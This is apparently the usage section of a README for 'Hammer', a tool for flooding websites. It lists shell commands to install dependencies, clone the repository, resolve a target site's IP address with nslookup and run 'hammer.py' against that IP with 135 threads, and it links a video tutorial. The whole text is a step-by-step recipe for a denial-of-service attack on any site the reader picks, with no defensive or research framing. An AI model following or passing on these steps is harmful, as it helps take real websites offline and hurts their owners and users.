## Usage:
```
$ apt update
$ apt upgrade
$ apt install python
$ apt install git
$ apt install dnsutils
$ git clone https://github.com/CruzTed/Hammer/

Hammer need the Name Server of a website which you want to attack...
To get the Name Server...just type
$ nslookup example.com
Note the IP Address of that Website

then
$ cd Hammer
$ python3 hammer.py -s [ip Address] -t 135
example:
$ python3 hammer.py -s 123.45.67.89 -t 135
```

## Video Tutorial:
How to use Hammer [`Watch it`](http://www.youtube.com/watch?v=HVbRUhX2EPo)

